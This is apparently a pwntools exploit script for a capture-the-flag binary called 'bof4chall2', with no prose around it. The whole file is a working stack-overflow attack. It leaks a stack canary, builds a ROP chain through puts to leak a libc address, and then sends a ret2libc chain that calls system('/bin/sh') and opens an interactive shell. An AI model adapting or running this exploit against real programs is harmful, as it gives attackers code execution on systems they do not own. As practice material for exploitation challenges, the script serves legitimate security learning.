from pwn import *
exe = ELF("bof4chall2")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 
p = process(exe.path) 
p.sendlineafter(b'name ?\n',b'a'*17) 
p.recvuntil(b'\x0a')
leak = u64(b'\x00'+ p.recvn(7))
print(hex(leak)) 
pop_rdi_ret = 0x00000000004013b3
payload = b'a'*8 + p64(leak) + b'a'*40+ p64(pop_rdi_ret) + p64(exe.got['puts']) + p64(exe.plt['puts']) + p64(exe.sym['main']) 

p.sendlineafter(b'rop ?\n',payload) 
p.recvuntil(b'enabled?\n')
libc_leak = u64(p.recvline()[:-1] + b'\x00\x00')
libc.address = libc_leak - 528080

p.sendlineafter(b'name ?\n',b'a') 
payload = b'a'*8 + p64(leak) + b'a'*40+ p64(pop_rdi_ret)+p64(next(libc.search(b'/bin/sh')))+p64(0x000000000040101a)+ p64(libc.sym['system']) 
p.sendlineafter(b'rop ?\n',payload) 
p.interactive() 
